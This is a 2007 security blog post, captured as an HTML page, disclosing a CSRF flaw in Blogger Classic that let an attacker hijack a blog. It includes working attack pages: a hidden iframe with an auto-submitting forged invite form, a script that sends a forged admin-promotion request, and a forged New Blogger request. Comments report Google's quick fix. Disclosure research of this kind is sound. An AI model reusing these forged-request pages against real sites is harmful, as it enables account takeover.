@@ -1,0 +1,89 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta meta name="viewport" content="width=device-width, initial-scale=1.0"><title>CSRF-ing Blogger Classic</title><meta name="description" content="In Blogger Classic, admin users who originally created a blog can be removed by other admin users. This behavior allows for a complete and non-reversible hijack of a Blogger Classic blog through  CSRF/XSRF/session riding/one-click attacks."><meta property="name" content="CSRF-ing Blogger Classic"><meta itemprop="name" content="CSRF-ing Blogger Classic"><meta property="description" content="In Blogger Classic, admin users who originally created a blog can be removed by other admin users. This behavior allows for a complete and non-reversible hijack of a Blogger Classic blog through  CSRF/XSRF/session riding/one-click attacks."><meta itemprop="description" content="In Blogger Classic, admin users who originally created a blog can be removed by other admin users. This behavior allows for a complete and non-reversible hijack of a Blogger Classic blog through  CSRF/XSRF/session riding/one-click attacks."><meta property="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fcsrf-ing-blogger-classic%2F?w=1024"><meta itemprop="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fcsrf-ing-blogger-classic%2F?w=1024"><meta property="og:type" content="website"><meta property="og:url" content="https://www.gnucitizen.org/blog/csrf-ing-blogger-classic/"><meta property="og:title" content="CSRF-ing Blogger Classic"><meta property="og:description" content="In Blogger Classic, admin users who originally created a blog can be removed by other admin users. This behavior allows for a complete and non-reversible hijack of a Blogger Classic blog through  CSRF/XSRF/session riding/one-click attacks."><meta property="og:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fcsrf-ing-blogger-classic%2F?w=1024"><meta name="twitter:title" content="CSRF-ing Blogger Classic"><meta name="twitter:description" content="In Blogger Classic, admin users who originally created a blog can be removed by other admin users. This behavior allows for a complete and non-reversible hijack of a Blogger Classic blog through  CSRF/XSRF/session riding/one-click attacks."><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fcsrf-ing-blogger-classic%2F?w=1024"><link type="text/css" href="/blog.css" rel="stylesheet"><script type="text/javascript" src="/blog.js"></script></head><body><header id="header"><h1><a href="/"></a></h1><p></p></header><nav id="topnav"><ul><li><a href="/">Home</a></li><li><a href="/projects.html">Projects</a></li><li><a href="/files">Files</a></li><li><a href="/about.html">About</a></li></ul></nav><article><div id="content"><h1 class="title">CSRF-ing Blogger Classic</h1><div>Fri, 19 Jan 2007 10:02:10 GMT</div><div id="post-content"><p>In <a href="http://www.blogger.com">Blogger</a> Classic, admin users who originally created a blog can be removed by other admin users. This behavior allows for a complete and non-reversible hijack of a Blogger Classic blog through  CSRF/XSRF/session riding/one-click attacks.</p>
+<p>The process is a two shots attacks, meaning that the victim admin user needs to click on two different links while being authenticated. Due to the nature of blogging, in which admins go through the comments posted by visitors, this attack is very feasible. This is probably even more true for blogs that are moderated, since blog admins review posts carefully including URLs embedded in posts before publishing the posts, thus clicking on the evil link <strong>while authenticated</strong>.</p>
+<p>What each evil URL does:</p>
+<ol>
+<li>Send an invitation link to the attacker on behalf of the admin user in order to become a blog member (only permission to create new posts is given to the attacker at this point)</li>
+<li>Change the attacker&#39;s permissions from guest to admin.</li>
+</ol>
+<p>After this, the attacker can login to the target blog as an admin user and remove the original admin user who created the blog (remember that in &quot;Blogger Classic&quot; admins users can remove the original admin user of the blog). The only rule is that there must exist <strong>at least one admin user</strong>. At this point, the victim admin user can never take control over the  blog even though he/she was the original founder.</p>
+<hr>
+<h3 id="blogger-classic-attack-step-1-html">blogger-classic-attack-step-1.html</h3>
+<pre><code class="language-html"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span><span class="tag">&lt;<span class="name">BODY</span>&gt;</span>
+<span class="tag">&lt;<span class="name">H1</span>&gt;</span>You are being CSRFed in the background while viewing this HTML page<span class="tag">&lt;/<span class="name">H1</span>&gt;</span>
+<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"./blogger-classic-add-user.html"</span> <span class="attr">height</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"0"</span> <span class="attr">frameborder</span>=<span class="string">"0"</span>&gt;</span>
+<span class="tag">&lt;/<span class="name">BODY</span>&gt;</span><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></code></pre>
+<hr>
+<h3 id="blogger-classic-add-user-html">blogger-classic-add-user.html</h3>
+<pre><code class="language-html"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span><span class="tag">&lt;<span class="name">BODY</span>&gt;</span>
+<span class="comment">&lt;!--
+Blogger Classic "invite new team member" request
+POST http://www.blogger.com/send-invite.do
+
+blogID=12345678&amp;email0=attacker@domain.com&amp;email1=&amp;email2=&amp;inviteMessage=
+
+<span class="doctag">Note:</span> 'blogID' can be found by visitors on the main page of a blog within several URLs in the source code of the page. Change 'email0' with attacker's email.
+--&gt;</span>
+<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">id</span>=<span class="string">"evil"</span> <span class="attr">name</span>=<span class="string">"evil"</span> <span class="attr">action</span>=<span class="string">"http://www.blogger.com/send-invite.do"</span>&gt;</span>
+<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"blogID"</span> <span class="attr">value</span>=<span class="string">"12345678"</span>&gt;</span>
+<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"email0"</span> <span class="attr">value</span>=<span class="string">"attacker@domain.com"</span>&gt;</span>
+<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"email1"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span>
+<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"email2"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span>
+<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"inviteMessage"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span>
+<span class="tag">&lt;/<span class="name">form</span>&gt;</span>
+<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.evil.submit()</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>
+<span class="tag">&lt;/<span class="name">BODY</span>&gt;</span><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></code></pre>
+<hr>
+<h3 id="blogger-classic-attack-step-2-html">blogger-classic-attack-step-2.html</h3>
+<pre><code class="language-html"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span>
+<span class="comment">&lt;!--
+This request is a GET, and makes an existing guest member (the attacker in this case) an admin.
+
+i.e.:
+http://www.blogger.com/team-member-modify.do?blogID=12345678&amp;memberID=55555555&amp;isAdmin=1
+
+<span class="doctag">Note:</span> assign to 'memberID' the value of the 'userID' of the attacker. 'userID' can be found after logging into Blogger Classic (rather than "New Blogger") using the attacker's Blogger Classic account and accessing "edit profile"  (variable in HTML form named 'userID').
+This value is also available in the address bar's URL after acessing "view profile" (i.e.: http://www.blogger.com/profile/55555555) .
+'blogID' is the same value as the one used in the first HTML attack page ("blogger-classic-add-user.html").
+--&gt;</span>
+<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">
+    var_blogID=<span class="number">12345678</span>; <span class="comment">// change to ID of target Blogger Classic blog</span>
+    var_memberID=<span class="number">55555555</span>; <span class="comment">// change to attacker's member ID</span>
+
+    <span class="keyword">new</span> Image().src=<span class="string">"http://www.blogger.com/team-member-modify.do?blogID="</span>+var_blogID+<span class="string">"&amp;memberID="</span>+var_memberID+<span class="string">"&amp;isAdmin=1"</span>;
+</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>
+<span class="tag">&lt;<span class="name">H1</span>&gt;</span>You are being CSRFed in the background while viewing this HTML page<span class="tag">&lt;/<span class="name">H2</span>&gt;</span>
+<span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></code></pre>
+<hr>
+<p>After visiting a URL that contains the second HTML file, the attacker can now login to the target blog as an admin user and remove the original owner of the blog, thus completely hijacking the blog. The attack could be even more automated, but the attack walkthrough discussed here is enough to take over a &quot;Classic Blogger&quot; blog.</p>
+<p>The first attack HTML file <em>attack-step-1.html</em> calls <em>blogger-classic-add-user.html</em> through an iframe so that the forged POST request is sent <strong>in the background</strong> while the victim admin user is viewing the HTML page. The second second attack HTML file <em>blogger-classic-attack-step-1.html</em> uses an image object that sends the forged GET request <strong>in the background</strong> without needing to use an iframe.</p>
+<p>By the way, in &quot;New Blogger&quot; there are also some interesting requests that are not being tokenized. Similar to Blogger Classic, changing profile details does require a token (i.e.: &#39;securityToken&#39; parameter), while inviting a new user, for instance, does not. I.e.:</p>
+<pre><code class="language-http">POST http://www2.blogger.com/add-authors.do
+
+blogID=1234567890123456789&amp;authorsList=attacker%40domain.com+&amp;submit=true</code></pre>
+<p>Note: I suspect that it is possible to tell when a blog is &quot;Classic Blogger&quot; or &quot;New Blogger&quot; by looking up the &#39;blogID&#39; value from the source code of the main blog page and checking if the numeric value is 8 digits long, rather than 19 digits long which is used by &quot;New Blogger&quot;</p>
+<p>Solution: admin users are recommended to switch to new blogger, and to use a different web browser to visit links while logged on to Blogger.</p>
+<p>Greetings to pdp, David Kierznowski , Amir Azam (thanks for testing the attack). This CSRF experiment is dedicated to my babe peluchita!!!</p>
+</div><div id="post-comments"><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pagvac"><span>pagvac</span><div class="post-comment-content">The reason for adding a comment to the post is that today January 22 2007, I examined the "add new user" request of both, Blogger Classic and New Blogger and I was impressed that Google had added tokens for both versions of Blogger.
+
+At first, when I informed Google and forwarded the research, they simply replied with automated emails, finally pointing me to a Blogger help URL.
+
+So I thought they didn't care much about CSRF issues. However, I must admit that I'm very impressed with them since they fixed the problem very fast.
+
+It'd be nice to get additional ideas from some of you guys if possible.
+
+Here is an example of the fixed "add new user" requests for both versions of Blogger (notice 'securityToken'):
+
+<pre><code>POST /add-authors.do HTTP/1.1
+Host: www2.blogger.com
+
+blogID=12345678&amp;securityToken=fmA1trWgTvwf6XZIlyn9WI_n0Nc%3D%3A1169507915539&amp;authorsList=%3Cattacker%40domain.com%3E%2C+&amp;submit=true</code></pre>
+
+
+<pre><code>POST /add-authors.do HTTP/1.1
+Host: www&#46;blogger.com
+
+blogID=12345678&amp;securityToken=fmA1trWgTvwf6XZIlyn9WI_n0Nc%3D%3A1169507915539&amp;authorsList=%3Cattacker%40domain.com%3E%2C+&amp;submit=true</code></pre>
+
+P.S.: I forgot to say thank you to Jeremiah Grossman who kindly gave me feedback on this research.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="mana"><span>mana</span><div class="post-comment-content">interesting write up, is there a fix for this attack?</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Adrian Pastor"><span>Adrian Pastor</span><div class="post-comment-content">Hello mana,
+
+As mentioned in my previous comment on this page, Google fixed the issue back on January 22 2007.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Andrea"><span>Andrea</span><div class="post-comment-content">But mine is template problem.When I was currently changing my template,when I click the 'Preview' button,then all I saw is the same error!Can you tell me what happen?</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Skeptic_fx"><span>Skeptic_fx</span><div class="post-comment-content">So did you enter the Google Security Hall of Fame? Guess you were way too early :P</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Skeptic_fx"><span>Skeptic_fx</span><div class="post-comment-content">Also there are some parts of google which still has some kind of CSRfs</div></div></div></div></article><footer id="footer"><p>Copyright &copy; 2019 <a href=""></a>. All rights reserved.</p></footer></body></html>
